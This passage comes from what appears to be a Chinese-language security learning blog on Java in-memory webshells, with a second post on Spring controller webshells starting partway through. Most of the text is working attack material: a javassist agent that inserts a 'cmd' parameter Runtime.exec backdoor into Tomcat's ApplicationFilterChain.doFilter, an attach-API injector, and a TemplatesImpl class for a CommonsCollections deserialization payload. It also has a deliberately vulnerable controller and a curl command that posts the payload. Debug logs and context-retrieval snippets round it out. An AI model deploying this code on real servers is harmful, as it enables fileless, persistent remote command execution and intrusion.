[5/6] Packaging agent JAR... rem 如果 src\\main\\resources\\META-INF\\MANIFEST.MF 存在则使用它 set MANIFEST_FILE=src\\main\\resources\\META-INF\\MANIFEST.MF if not exist \u0026#34;%MANIFEST_FILE%\u0026#34; set MANIFEST_FILE=META-INF\\MANIFEST.MF \u0026#34;%JAVA_HOME%\\bin\\jar\u0026#34; cfm target\\Demo01-1.0-SNAPSHOT.jar \u0026#34;%MANIFEST_FILE%\u0026#34; -C target\\classes . if errorlevel 1 ( echo Failed to package agent JAR! pause exit /b 1 ) echo [6/6] Creating injector JAR... \u0026#34;%JAVA_HOME%\\bin\\jar\u0026#34; cfe target\\Injector.jar com.src.injector.Injector -C target\\classes . if errorlevel 1 ( echo Failed to package injector JAR! pause exit /b 1 ) echo. echo ======================================== echo Build Successful! echo Generated files: echo - target\\Demo01-1.0-SNAPSHOT.jar (Agent with embedded javassist) echo - target\\Injector.jar (Injector) echo ======================================== echo. pause 执行 build.bat 开始测试 启动一个 Tomcat Tomcat 进程 plain\r1 2 3 4 5 6 7 8 # 查看所有 Java 进程 jps -l # 查看进程详细信息 tasklist | findstr \u0026#34;java\u0026#34; # 或者使用 wmic wmic process where \u0026#34;name=\u0026#39;java.exe\u0026#39;\u0026#34; get processid,commandline 找到进程：40268 org.apache.catalina.startup.Bootstrap\n测试注入 使用管理员身份运行！！\ntext\r1 java -cp \u0026#34;D:\\Java\\jdk1.8.0_65\\lib\\tools.jar;D:\\JavaCode\\内存马\\AgentMem\\Demo01\\target\\Injector.jar\u0026#34; com.src.injector.Injector **40268** D:\\JavaCode\\内存马\\AgentMem\\Demo01\\target\\Demo01-1.0-SNAPSHOT.jar （为了防止一些莫名其妙的错误，使用了绝对路径）\n注入成功\nTomcat 日志：\nplain\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 // Agent 已经被成功加载到目标 JVM 中，agentmain() 被调用，注入成功 AgentMemShell Injected! //对多个已加载（loaded）且继承自 HttpServlet 的类执行了 retransformClasses()，并且这些子类都成功被重转换（retransform success） Found HttpServlet subclass: class org.apache.jsp.index_jsp Retransform subclass Success: class org.apache.jsp.index_jsp Found HttpServlet subclass: class com.src.testtomcat.HelloServlet Retransform subclass Success: class com.src.testtomcat.HelloServlet Found HttpServlet subclass: class org.apache.jasper.runtime.HttpJspBase Retransform subclass Success: class org.apache.jasper.runtime.HttpJspBase Found HttpServlet subclass: class org.apache.jasper.servlet.JspServlet [Debug] Loading class: org/apache/jasper/servlet/JspServlet Retransform subclass Success: class org.apache.jasper.servlet.JspServlet Found HttpServlet subclass: class org.apache.catalina.servlets.DefaultServlet [Debug] Loading class: org/apache/catalina/servlets/DefaultServlet Retransform subclass Success: class org.apache.catalina.servlets.DefaultServlet //成功对 javax.servlet.http.HttpServlet（基类） 做了 transform（插入/修改字节码），并把修改生效了（retransform success） Found HttpServlet (base): class javax.servlet.http.HttpServlet [Debug] Loading class: javax/servlet/http/HttpServlet [+] Found target class: javax.servlet.http.HttpServlet [+] Start transforming HttpServlet... [+] HttpServlet Transformed Complete. Retransform HttpServlet Success. //transform() 调用中抛出了 NullPointerException [!] Transform failed: java.lang.NullPointerException java.lang.NullPointerException at com.src.agent.ServletTransformer.transform(ServletTransformer.java:28) at sun.instrument.TransformerManager.transform(TransformerManager.java:188) at sun.instrument.InstrumentationImpl.transform(InstrumentationImpl.java:428) at sun.misc.Unsafe.defineAnonymousClass(Native Method) at java.lang.invoke.InnerClassLambdaMetafactory.spinInnerClass(InnerClassLambdaMetafactory.java:326) at java.lang.invoke.InnerClassLambdaMetafactory.buildCallSite(InnerClassLambdaMetafactory.java:194) at java.lang.invoke.LambdaMetafactory.metafactory(LambdaMetafactory.java:304) at java.lang.invoke.CallSite.makeSite(CallSite.java:302) at java.lang.invoke.MethodHandleNatives.linkCallSiteImpl(MethodHandleNatives.java:307) at java.lang.invoke.MethodHandleNatives.linkCallSite(MethodHandleNatives.java:297) at org.apache.tomcat.util.http.Parameters.addParameter(Parameters.java:212) at org.apache.tomcat.util.http.Parameters.processParameters(Parameters.java:390) at org.apache.tomcat.util.http.Parameters.processParameters(Parameters.java:481) at org.apache.tomcat.util.http.Parameters.handleQueryParameters(Parameters.java:194) at org.apache.catalina.connector.Request.parseParameters(Request.java:2938) at org.apache.catalina.connector.Request.getParameter(Request.java:1088) at org.apache.catalina.connector.RequestFacade.getParameter(RequestFacade.java:309) at javax.servlet.http.HttpServlet.service(HttpServlet.java) at javax.servlet.http.HttpServlet.service(HttpServlet.java:623) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:199) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:168) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:168) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:482) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:130) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93) at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:656) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:346) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:397) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:935) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1792) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52) at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1189) at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:658) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63) at java.lang.Thread.run(Thread.java:745) 可以执行命令：\n（：但是当前的内存马只是部分生效，/hello-servlet 路径可以执行，其他不可以\n4.3.2 方式二 环境 SpringBoot 2.6.13\nCommonCollection 3.2.1\n搭建一个反序列化环境：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package com.src.demos.web; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.ResponseBody; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.ObjectInputStream; @Controller public class AgentFilter { @ResponseBody @RequestMapping(\u0026#34;/cc\u0026#34;) public String cc11Vuln(HttpServletRequest request, HttpServletResponse response) throws Exception { java.io.InputStream inputStream = request.getInputStream(); ObjectInputStream objectInputStream = new ObjectInputStream(inputStream); objectInputStream.readObject(); return \u0026#34;Hello,World\u0026#34;; } @ResponseBody @RequestMapping(\u0026#34;/demo\u0026#34;) public String demo(HttpServletRequest request, HttpServletResponse response) throws Exception{ return \u0026#34;This is OK Demo!\u0026#34;; } } 寻找关键类 在Filter中存在doFilter方法，除了会对我们的请求进行过滤，会依次调用FilterChains中的Filter，同时在 ApplicationFilterChain#doFilter 中还封装了我们用户请求的 request 和 response ，那么如果我们能够注入该方法，那么我们不就可以直接获取用户的请求，将执行结果写在 response 中进行返回。\n反序列化注入 注入流程如下：\n编写 agent.jar 从而实现 org.apache.catalina.core.ApplicationFilterChain#doFilter 进行字节码修改 利用 CC依赖 的反序列化漏洞将我们的加载代码打进去，然后使其执行来加载我们的 agent.jar agent.jar pom.xml\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;com.src\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;Demo02\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;maven.compiler.source\u0026gt;8\u0026lt;/maven.compiler.source\u0026gt; \u0026lt;maven.compiler.target\u0026gt;8\u0026lt;/maven.compiler.target\u0026gt; \u0026lt;project.build.sourceEncoding\u0026gt;UTF-8\u0026lt;/project.build.sourceEncoding\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.29.2-GA\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/project\u0026gt; AgentMain.java\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import java.lang.instrument.Instrumentation; public class AgentMain { public static final String ClassName = \u0026#34;org.apache.catalina.core.ApplicationFilterChain\u0026#34;; public static void agentmain(String agentArgs, Instrumentation ins) { ins.addTransformer(new DefineTransformer(),true); // 获取所有已加载的类 Class[] classes = ins.getAllLoadedClasses(); for (Class clas:classes){ if (clas.getName().equals(ClassName)){ try{ // 对类进行重新定义 ins.retransformClasses(new Class[]{clas}); } catch (Exception e){ e.printStackTrace(); } } } } } DefineTransformer.java\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 import javassist.*; import java.lang.instrument.ClassFileTransformer; import java.security.ProtectionDomain; public class DefineTransformer implements ClassFileTransformer { public static final String ClassName = \u0026#34;org.apache.catalina.core.ApplicationFilterChain\u0026#34;; @Override public byte[] transform(ClassLoader loader, String className, Class\u0026lt;?\u0026gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) { className = className.replace(\u0026#34;/\u0026#34;,\u0026#34;.\u0026#34;); if (className.equals(ClassName)){ System.out.println(\u0026#34;Find the Inject Class: \u0026#34; + ClassName); ClassPool pool = ClassPool.getDefault(); try { CtClass c = pool.getCtClass(className); CtMethod m = c.getDeclaredMethod(\u0026#34;doFilter\u0026#34;); m.insertBefore(\u0026#34;javax.servlet.http.HttpServletRequest req = request;\\n\u0026#34; + \u0026#34;javax.servlet.http.HttpServletResponse res = response;\\n\u0026#34; + \u0026#34;java.lang.String cmd = request.getParameter(\\\u0026#34;cmd\\\u0026#34;);\\n\u0026#34; + \u0026#34;if (cmd != null){\\n\u0026#34; + \u0026#34; try {\\n\u0026#34; + \u0026#34; java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\\n\u0026#34; + \u0026#34; java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\\n\u0026#34; + \u0026#34; String line;\\n\u0026#34; + \u0026#34; StringBuilder sb = new StringBuilder(\\\u0026#34;\\\u0026#34;);\\n\u0026#34; + \u0026#34; while ((line=reader.readLine()) != null){\\n\u0026#34; + \u0026#34; sb.append(line).append(\\\u0026#34;\\\\n\\\u0026#34;);\\n\u0026#34; + \u0026#34; }\\n\u0026#34; + \u0026#34; response.getOutputStream().print(sb.toString());\\n\u0026#34; + \u0026#34; response.getOutputStream().flush();\\n\u0026#34; + \u0026#34; response.getOutputStream().close();\\n\u0026#34; + \u0026#34; } catch (Exception e){\\n\u0026#34; + \u0026#34; e.printStackTrace();\\n\u0026#34; + \u0026#34; }\\n\u0026#34; + \u0026#34;}\u0026#34;); byte[] bytes = c.toBytecode(); c.detach(); return bytes; } catch (Exception e){ e.printStackTrace(); } } return new byte[0]; } } maven 打包后 得到的 target/Demo02-1.0-SNAPSHOT.jar 就是我们需要的 agent.jar\n编写java代码来将其加载进JVM中\n其中大致思路为获取到JVM的PID，调用 loadAgent 方法将 agent.jar 注入\nInjectMain.java java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 package com.src; public class InjectMain { public static void main(String[] args) { try{ java.lang.String path = \u0026#34;D:\\\\JavaCode\\\\内存马\\\\AgentMem\\\\Demo02\\\\target\\\\Demo02-1.0-SNAPSHOT.jar\u0026#34;; java.io.File toolsPath = new java.io.File(System.getProperty(\u0026#34;java.home\u0026#34;).replace(\u0026#34;jre\u0026#34;,\u0026#34;lib\u0026#34;) + java.io.File.separator + \u0026#34;tools.jar\u0026#34;); java.net.URL url = toolsPath.toURI().toURL(); java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url}); Class/*\u0026lt;?\u0026gt;*/ MyVirtualMachine = classLoader.loadClass(\u0026#34;com.sun.tools.attach.VirtualMachine\u0026#34;); Class/*\u0026lt;?\u0026gt;*/ MyVirtualMachineDescriptor = classLoader.loadClass(\u0026#34;com.sun.tools.attach.VirtualMachineDescriptor\u0026#34;); java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod(\u0026#34;list\u0026#34;,null); java.util.List/*\u0026lt;Object\u0026gt;*/ list = (java.util.List/*\u0026lt;Object\u0026gt;*/) listMethod.invoke(MyVirtualMachine,null); System.out.println(\u0026#34;Running JVM list ...\u0026#34;); for(int i=0;i\u0026lt;list.size();i++){ Object o = list.get(i); java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod(\u0026#34;displayName\u0026#34;,null); java.lang.String name = (java.lang.String) displayName.invoke(o,null); // 列出当前有哪些 JVM 进程在运行 // 这里的 if 条件根据实际情况进行更改 if (name.contains(\u0026#34;com.src.Demo02EnvApplication\u0026#34;)){ // 获取对应进程的 pid 号 java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod(\u0026#34;id\u0026#34;,null); java.lang.String id = (java.lang.String) getId.invoke(o,null); System.out.println(\u0026#34;id \u0026gt;\u0026gt;\u0026gt; \u0026#34; + id); java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod(\u0026#34;attach\u0026#34;,new Class[]{java.lang.String.class}); java.lang.Object vm = attach.invoke(o,new Object[]{id}); java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod(\u0026#34;loadAgent\u0026#34;,new Class[]{java.lang.String.class}); loadAgent.invoke(vm,new Object[]{path}); java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod(\u0026#34;detach\u0026#34;,null); detach.invoke(vm,null); System.out.println(\u0026#34;Agent.jar Inject Success !!\u0026#34;); break; } } } catch (Exception e){ e.printStackTrace(); } } } CC 反序列化注入 通过CC反序列化进行注入Agent内存马， 编译生成 Test.class\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 package com.src; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { static { try{ java.lang.String path = \u0026#34;D:\\\\JavaCode\\\\内存马\\\\AgentMem\\\\Demo02\\\\target\\\\Demo02-1.0-SNAPSHOT.jar\u0026#34;; java.io.File toolsPath = new java.io.File(System.getProperty(\u0026#34;java.home\u0026#34;).replace(\u0026#34;jre\u0026#34;,\u0026#34;lib\u0026#34;) + java.io.File.separator + \u0026#34;tools.jar\u0026#34;); java.net.URL url = toolsPath.toURI().toURL(); java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url}); Class/*\u0026lt;?\u0026gt;*/ MyVirtualMachine = classLoader.loadClass(\u0026#34;com.sun.tools.attach.VirtualMachine\u0026#34;); Class/*\u0026lt;?\u0026gt;*/ MyVirtualMachineDescriptor = classLoader.loadClass(\u0026#34;com.sun.tools.attach.VirtualMachineDescriptor\u0026#34;); java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod(\u0026#34;list\u0026#34;,null); java.util.List/*\u0026lt;Object\u0026gt;*/ list = (java.util.List/*\u0026lt;Object\u0026gt;*/) listMethod.invoke(MyVirtualMachine,null); System.out.println(\u0026#34;Running JVM list ...\u0026#34;); for(int i=0;i\u0026lt;list.size();i++){ Object o = list.get(i); java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod(\u0026#34;displayName\u0026#34;,null); java.lang.String name = (java.lang.String) displayName.invoke(o,null); // 列出当前有哪些 JVM 进程在运行 // 这里的 if 条件根据实际情况进行更改 if (name.contains(\u0026#34;com.src.Demo02EnvApplication\u0026#34;)){ // 获取对应进程的 pid 号 java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod(\u0026#34;id\u0026#34;,null); java.lang.String id = (java.lang.String) getId.invoke(o,null); System.out.println(\u0026#34;id \u0026gt;\u0026gt;\u0026gt; \u0026#34; + id); java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod(\u0026#34;attach\u0026#34;,new Class[]{java.lang.String.class}); java.lang.Object vm = attach.invoke(o,new Object[]{id}); java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod(\u0026#34;loadAgent\u0026#34;,new Class[]{java.lang.String.class}); loadAgent.invoke(vm,new Object[]{path}); java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod(\u0026#34;detach\u0026#34;,null); detach.invoke(vm,null); System.out.println(\u0026#34;Agent.jar Inject Success !!\u0026#34;); break; } } } catch (Exception e){ e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } public Test(){ } } 用 java-chains , 把 Test.class 注入到 TemplatesImpl 的 _bytecodes，生成了 JavaNativePayload_…txt 文件。\ntext\r1 curl -v \u0026#34;http://localhost:8089/cc\u0026#34; --data-binary @test.ser 内存马注入情况 从日志来看：\nRunning JVM list \u0026hellip;\nid \u0026raquo;\u0026gt; 40008\nFind the Inject Class: org.apache.catalina.core.ApplicationFilterChain\nAgent.jar Inject Success !!\n使用的 Demo02-1.0-SNAPSHOT.jar 成功 attach 到了目标 JVM（PID 40008）。\norg.apache.catalina.core.ApplicationFilterChain 作为 hook 入口已经被找到。\n也就是说，内存马的 Agent 部分已经成功加载到 JVM。\n所以注入是成功的，这部分没有问题\ncurl 请求触发了 POST /cc，但是返回：\njava\r1 2 3 4 5 6 7 8 9 java.lang.NullPointerException: null at com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.postInitialization(AbstractTranslet.java:372) ~[na:1.8.0_65] at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:456) ~[na:1.8.0_65] at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:486) ~[na:1.8.0_65] at com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.\u0026lt;init\u0026gt;(TrAXFilter.java:64) ~[na:1.8.0_65] at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) ~[na:1.8.0_65] at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) ~[na:1.8.0_65] at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) ~[na:1.8.0_65] at java.lang.reflect.Constructor.newInstance(Constructor.java:422) ~[na:1.8.0_65] 分析原因：\n你上传的 payload 是基于 CommonsCollections K3 + TemplatesImpl 的序列化。\n错误发生在 TemplatesImpl 初始化阶段的 postInitialization 方法：\nNullPointerException 一般是因为 TemplatesImpl 中 _bytecodes 或 _name 等字段为 null。\n也就是说 test.ser 文件中，TemplatesImpl 对象没有正确填充字节码\u0026hellip;.\n为什么生成的时候没有写进去呢？\n参考： 【原创】利用“进程注入”实现无文件不死webshell\nJava安全学习——内存马 - 枫のBlog\nSpring内存马 | CurlySean’s Blog\nJava Agent实现反序列化注入内存shell\nJavaWeb 内存马一周目通关攻略 | 素十八\nJavaWeb 内存马二周目通关攻略 | 素十八\nShell中的幽灵王者—JAVAWEB 内存马 【认知篇】 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com\nJava内存马——Tomcat Valve型的三种注入 - FreeBuf网络安全行业门户\nJava 内存马（四）：Spring Boot Controller 内存马 | 渐怀的博客\nSpring型内存马分析\nServlet 简介 | 菜鸟教程\nSpring内存马学习\nSpring内存马——Controller/Interceptor构造\n[基础篇 - Javassist 使用指南](https://changeyourway.github.io/2024/06/07/Java 安全/基础篇-javassist用法指南/)\nJava安全学习——ROME反序列化 - 枫のBlog （使用Javassist缩短恶意class）\nJava Agent实现反序列化注入内存shell\nAgent内存马 | CurlySean’s Blog\n","permalink":"http://localhost:1313/xvsf/posts/java-%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E5%9B%9B%E7%AF%87---agent-%E5%86%85%E5%AD%98%E9%A9%AC/","summary":"\u003ch1 id=\"java-内存马第四篇---agent-内存马\"\u003eJava 内存马第四篇 - Agent 内存马\u003c/h1\u003e\n\u003ch1 id=\"四-java-agent-内存马\"\u003e四、 Java Agent 内存马\u003c/h1\u003e\n\u003ch2 id=\"41-java-agent示例\"\u003e4.1 Java Agent示例\u003c/h2\u003e\n\u003cp\u003e对于Agent（代理）来讲，其大致可以分为两种，一种是在\u003cstrong\u003eJVM启动前加载的\u003c/strong\u003e\u003ccode\u003e**premain-Agent**\u003c/code\u003e，另一种是\u003cstrong\u003eJVM启动之后加载的\u003c/strong\u003e\u003ccode\u003e**agentmain-Agent**\u003c/code\u003e。这里我们可以将其理解成一种特殊的Interceptor（拦截器），如下图\u003c/p\u003e","title":"Java 内存马第四篇 - Agent 内存马"},{"content":"Java 内存马第三篇 - Spring 内存马 三、Spring 内存马 1、Controller 内存马 一些基础知识： Bean Bean 是 Spring 框架的一个核心概念，它是构成应用程序的主干，并且是由 Spring IoC 容器负责实例化、配置、组装和管理的对象。\nbean 是对象 bean 被 IoC 容器管理 Spring 应用主要是由一个个的 bean 构成的 IOC容器 如果一个系统有大量的组件（类），其生命周期和相互之间的依赖关系如果由组件自身来维护，不但大大增加了系统的复杂度，而且会导致组件之间极为紧密的耦合，继而给测试和维护带来了极大的困难。解决这一问题的核心方案就是IoC（又称为依赖注入）。由IoC负责创建组件、根据依赖关系组装组件、按依赖顺序正确销毁组件。\nIOC容器通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的零元数据可以用xml、Java注解或Java代码来表示。\nApplicationContext Spring 框架中，BeanFactory 接口是 Spring IoC容器 的实际代表者\nSpring容器就是ApplicationContext，它是一个接口继承于BeanFactory，有很多实现类。获得了ApplicationContext的实例，就获得了IoC容器的引用。我们可以从ApplicationContext中可以根据Bean的ID获取Bean。\n因此，org.springframework.context.ApplicationContext接口也代表了 IoC容器 ，它负责实例化、定位、配置应用程序中的对象(bean)及建立这些对象间(beans)的依赖。\n1.1 Controller 创建 SpringController.java\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.src.springmem.demos.web; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.ResponseBody; @Controller public class SpringController { @ResponseBody @RequestMapping(\u0026#34;/hello\u0026#34;) public String sayHello(){ return \u0026#34;hello world\u0026#34;; } } 1.2 Controller 注册流程 之前学习的 servlet、filter、listener 等都是通过访问特定路由来访问上传的内存马，那么在 Spring 中直观体现路由逻辑的就是 Controller。\n核心请求链路:\n当访问 http://127.0.0.1:8098/hello 时，请求经过以下关键步骤：\nServlet 容器层：请求先经过 Tomcat 内置容器的 Filter 链（如 WsFilter、RequestContextFilter） Spring MVC 入口：进入 DispatcherServlet（Spring MVC 核心前端控制器） 请求分发：DispatcherServlet.doDispatch() 方法负责请求分发，核心逻辑是「找到匹配的 Controller 方法」 Handler 映射：通过 getHandler() 方法遍历 handlerMappings 列表，找到能处理 /index 路径的映射器 方法执行：调用匹配的 Controller 方法（MyController.index()），返回响应结果 断点调试，分析 Controller 的注册流程\ndoDispatch 函数通常出现在基于 Spring MVC 框架的 Java Web 应用程序中，它是 DispatcherServlet 类的一个方法。DispatcherServlet 是 Spring MVC 中的核心控制器（前端控制器），负责接收所有的 HTTP 请求，并根据请求映射（通常是通过注解或 XML 配置）来决定应该调用哪个控制器（Controller）来处理这个请求。 具体来说，doDispatch 方法的主要职责包括：\n解析请求：从传入的 HTTP 请求中提取必要的信息，比如请求路径、请求方法等。 查找处理器：使用处理器映射（HandlerMapping）机制来找到能够处理当前请求的处理器对象（即 Controller 中的方法）。这一步骤涉及将 URL 路径与已注册的处理器进行匹配。 创建处理器适配器：一旦找到了合适的处理器，就会通过处理器适配器（HandlerAdapter）来调用该处理器。处理器适配器负责执行具体的控制逻辑，并返回一个模型视图对象（ModelAndView）。 渲染响应：基于处理器返回的模型视图对象，选择合适的视图解析器（ViewResolver）来生成最终的响应内容。这可能涉及到从数据库获取数据、调用业务逻辑服务等操作。 处理异常：如果在上述过程中发生任何异常，doDispatch 也会负责捕获这些异常并通过适当的异常解析器（ExceptionResolver）来处理它们，确保应用程序能够优雅地应对错误情况并给客户端返回有意义的信息。 总之，doDispatch 在 Spring MVC 的工作流程中扮演了极其重要的角色，它协调了从接收到请求到产生响应的整个过程，是实现松耦合且可扩展Web应用的关键部分之一。\n我们从 doDispatch 开始看\n访问 /hello 路由时，首先要进入到 getHandler()\ngetHandler() 中有一个 HandlerMappings，HandlerMappings 中存在 5 个HandlerMapping ,\n通过这五个来确定当前请求的处理程序\n//Determine handler adapter for the current request.\t确定当前请求的处理程序适配器。\nHandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());\n通过 HandlerMapping 找到 Handler，**getHandlerAdapter(mappedHandler.getHandler())** ：根据找到的**Handler**的类型，找到能处理它的 **HandlerAdapter**。\n在这一过程中，选择了适配器进行处理\n继续往下，这一步时实际处理 handler 的\n//Actually invoke the handler.\nmv = ha.handle(processedRequest, response, mappedHandler.getHandler());\n现在需要返回到 mappedHandler = getHandler(processedRequest);\n在这一步中，会进入 getHandler()\n​\n最终会来到： getHandlerInternal() 方法\n而其中的 mappingRegistry 中存放着我们的路由信息\n这里首先对mappingRegistry进行上锁，最后在 finally 块中，进行解锁，\n在 lookupPath 中获取了我们访问的路由\n接下来分析一下它的注册流程：\n在 AbstractHandlerMethodMapping.initHandlerMethods 处下断点调试\ninitHandlerMethods 方法扫描 ApplicationContext 中的 bean，检测和注册处理程序方法\n使用processCandidateBean方法中来处理bean\n断点要让他运行直到获得我们需要的 SpringController\n进入 processCandidateBean 方法\n首先通过 getType() 获取到了 beanType\n判断该Bean是否为Handler对象，如果是的话，就将其传入detectHandlerMethods方法中\ngetUserClass 获取类名\n获取方法名\nregisterHandlerMethod 执行注册操作\n1.3 内存马编写 1.3.1 获取上下文 对于内存马的注入，最重要的事情就是获取上下文，在Tomcat中获取说的上下文为StandardContext，对于Spring获取的就是WebApplicationContext。\n五种方法：\nContextLoader WebApplicationContextUtils RequestContextUtils getAttribute 反射获取 ContextLoader getCurrentWebApplicationContext 获得的是一个 XmlWebApplicationContext 实例类型的 Root WebApplicationContext。\njava\r1 WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext(); WebApplicationContextUtils 通过这种方法获得的也是一个 Root WebApplicationContext。其中 WebApplicationContextUtils.getWebApplicationContext 函数也可以用 WebApplicationContextUtils.getRequiredWebApplicationContext来替换。\njava\r1 WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext()); RequestContextUtils 通过 ServletRequest 类的实例来获得 Child WebApplicationContext。\njava\r1 WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()); getAttribute 这种方式与前几种的思路就不太一样了，因为所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。所以通过直接获得ServletContext通过属性Context拿到 Child WebApplicationContext\njava\r1 WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(\u0026#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT\u0026#34;, 0); 反射获取 还可以通过反射获取LiveBeansView类的applicationContexts 属性来获取上下文。\njava\r1 2 3 4 5 6 // 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性 java.lang.reflect.Field 